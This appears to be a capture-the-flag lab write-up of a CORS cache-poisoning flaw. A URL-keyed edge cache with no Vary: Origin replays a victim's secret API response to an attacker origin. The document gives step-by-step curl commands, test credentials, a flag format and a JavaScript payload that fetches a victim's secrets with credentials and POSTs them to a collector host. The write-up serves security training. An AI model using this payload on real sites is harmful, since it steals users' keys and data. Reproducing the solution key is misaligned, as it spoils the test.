# CORS — MissingVary · Quotabank (difficulty: high · CUT CANDIDATE)

`GET /api/secret` (login required) returns `{username, api_key, balance}` and is served through Quotabank's edge cache whose **key is the URL only** — no `Vary: Origin`, no cookie in the key. The first response generated for the URL is cached in full (body **and** ACAO header) and replayed verbatim to every later requester. So a cross-site fetch made with the victim's session bakes the victim's body together with `ACAO: <attacker origin>` into the cache; afterwards **any** request — no session at all — hits the cache and receives the victim's body with the attacker's stored ACAO. Real-world lesson: caches in front of credentialed, origin-varying responses must `Vary: Origin` and must never replay one principal's body to another. Marked `cut_candidate` (heaviest CORS build, arch §7.3).

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01`; watch the cache monitor on the dashboard (URL-keyed entries, `Vary` not set). Purge (`POST /cache/purge`) whenever you poison the entry with your own data.
2. Bot fetch #1 — the victim's credentialed cross-site fetch bakes the cache: `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/api/secret","origin":"http://attacker.target.lab:8119"}'` (default session = the innocent; the monitor should now show the entry with the stored ACAO).
3. Bot fetch #2 — session-free cache hit replayed to the attacker origin: `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/api/secret","origin":"http://attacker.target.lab:8119","cookies":{}}'` — same body, no session required.
4. Store the artifact on the exploit server (the page that would perform step 2/3 in a real browser): `fetch('http://victim.target.lab:8119/api/secret',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://collector.target.lab:8119/collect',{method:'POST',body:d}))`.
5. `curl http://collector.target.lab:8119/verify` → flag.

Flag: `DSLTV{CORS-MissingVary-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
